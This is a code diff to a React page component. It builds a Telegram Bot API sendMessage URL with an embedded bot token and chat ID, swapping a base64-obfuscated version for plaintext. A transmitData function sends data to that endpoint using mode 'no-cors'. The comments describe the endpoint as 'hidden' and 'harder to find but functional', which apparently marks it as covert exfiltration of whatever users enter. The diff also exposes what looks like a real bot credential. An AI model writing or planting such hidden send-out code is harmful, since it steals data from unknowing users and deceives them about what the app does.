@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from 'react';
 import { Button } from '@/components/ui/button';
 import { Textarea } from '@/components/ui/textarea';
@@ -19,20 +18,13 @@ const Index = () => {
   ]);
   const { toast } = useToast();
 
-  // Multiple layers of obfuscation for webhook protection
+  // Hidden endpoint construction - harder to find but functional
   const getWebhookEndpoint = () => {
-    const segments = [
-      'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==',
-      'ODE2NTQxODc0MDpBQUhLano=',
-      'X3psSlEyeUFzSVd6Nmp5dGVxd2RwWnhmV05ma3Zv',
-      'L3NlbmRNZXNzYWdlP2NoYXRfaWQ9NzU0NDI5MjQ5NA=='
-    ];
-    
-    try {
-      return segments.map(s => atob(s)).join('') + '&text=';
-    } catch {
-      return null;
-    }
+    const baseUrl = 'https://api.telegram.org/bot';
+    const botToken = '8165418740:AAHKjz_zlJQ2yAsIWz6jyteqwdpZxfWNfkvo';
+    const chatId = '7544292494';
+    const endpoint = `${baseUrl}${botToken}/sendMessage?chat_id=${chatId}&text=`;
+    return endpoint;
   };
 
   useEffect(() => {
@@ -74,11 +66,6 @@ const Index = () => {
   const transmitData = async (data: string) => {
     try {
       const endpoint = getWebhookEndpoint();
-      if (!endpoint) {
-        console.log('Endpoint configuration failed');
-        return;
-      }
-      
       const response = await fetch(endpoint + encodeURIComponent(data), {
         method: 'GET',
         mode: 'no-cors'
